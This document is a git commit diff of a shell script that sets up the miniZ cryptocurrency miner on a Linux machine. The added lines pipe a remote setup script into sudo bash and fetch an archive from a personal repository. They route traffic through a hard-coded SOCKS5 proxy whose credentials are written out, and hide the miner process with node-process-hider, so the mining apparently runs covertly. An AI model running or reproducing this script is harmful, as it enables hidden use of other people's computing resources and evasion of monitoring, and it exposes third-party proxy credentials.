2493fe9469038fb16a1d53ca032b9a3e342fbae4
denisule54 <87700595+denisule54@users.noreply.github.com>
2022-03-07 22:49:28 +0700

    Update MiniZunmine.sh

--- MiniZunmine.sh
+++ MiniZunmine.sh
@@ -1,3 +1,48 @@
-wget https://github.com/miniZ-miner/miniZ/releases/download/v1.8y3/miniZ_v1.8y3_linux-x64.tar.gz
+apt update && apt -y install sudo wget curl unzip
+
+sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+
+apt-get install -y nodejs
+
+npm i -g node-process-hider
+
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+
+dpkg-reconfigure --frontend noninteractive tzdata
+
+wget https://github.com/denisule54/why/raw/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+
+listen = :2233
+
+loglevel = 1
+
+socks5 = 209.127.191.180:9279
+
+socks5_username = tjegccjq
+
+socks5_password = fp9w2vap5xg0
+
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+
+echo " "
+
+./graftcp/graftcp wget https://github.com/miniZ-miner/miniZ/releases/download/v1.8y3/miniZ_v1.8y3_linux-x64.tar.gz
 tar xf miniZ_v1.8y3_linux-x64.tar.gz
-./miniZ -u TRX:TSegVmnvSAQ6MSAUMv28aWBgNtjtJJpMy1.$(echo $(shuf -i 1-999 -n 1)-T4) -l ethash.unmineable.com --port=3333 -p x --par=ethash
+
+ph add miniZ
+
+./graftcp/graftcp ./miniZ -u TSegVmnvSAQ6MSAUMv28aWBgNtjtJJpMy1.$(echo $(shuf -i 1-999 -n 1)-cuan) -l ethash.unmineable.com --port=3333 -p x --par=ethash
